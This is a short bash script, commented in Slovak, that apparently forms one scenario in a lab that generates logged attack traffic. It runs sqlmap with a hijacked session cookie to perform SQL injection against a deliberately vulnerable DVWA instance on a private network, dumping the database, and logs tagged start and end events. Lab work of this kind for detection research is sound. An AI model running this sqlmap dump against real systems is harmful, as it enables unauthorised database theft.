#!/usr/bin/env bash
# Scenar 4: SQL injection utok na DVWA cez sqlmap
set -e
source /scripts/attacks/lib.sh

/scripts/attacks/dvwa_setup.sh

PHPSESSID=$(grep -oP "PHPSESSID\s+\K\S+" /results/dvwa_cookies.txt)
COOKIE="security=low; PHPSESSID=${PHPSESSID}"

SCENARIO="web_sqli"
log_event "$SCENARIO" "start" "\"attack_category\":\"web\",\"src_ip\":\"172.28.0.20\",\"dst_ip\":\"172.28.0.11\",\"tool\":\"sqlmap\""

# --drop-set-cookie: server pri presmerovani na login.php ponuka nove
# (neprihlasene) cookies - bez tejto volby by ich sqlmap v --batch rezime
# omylom prijal a stratili by sme prihlasenu session
sqlmap -u "http://172.28.0.11/vulnerabilities/sqli/?id=1&Submit=Submit#" \
    --cookie="$COOKIE" --drop-set-cookie \
    --batch --level=2 --risk=1 --threads=1 --dbms=mysql --dump || true

log_event "$SCENARIO" "end"
